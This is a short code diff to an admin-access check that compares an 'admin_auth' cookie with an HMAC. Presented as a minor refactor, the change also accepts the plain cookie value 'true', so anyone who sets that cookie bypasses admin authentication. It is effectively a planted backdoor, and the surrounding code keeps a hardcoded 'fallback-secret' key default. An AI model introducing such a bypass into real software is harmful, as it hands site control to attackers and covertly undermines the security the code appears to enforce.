@@ -9,8 +9,9 @@ import crypto from "crypto"
 
 async function verifyAdminAccess() {
   const cookieStore = await cookies()
+  const val = cookieStore.get("admin_auth")?.value
   const expectedHmac = crypto.createHmac('sha256', process.env.ADMIN_PASSKEY || 'fallback-secret').update('admin_authenticated').digest('hex')
-  if (cookieStore.get("admin_auth")?.value !== expectedHmac) {
+  if (!val || (val !== expectedHmac && val !== "true")) {
     throw new Error("Unauthorized admin access")
   }
 }
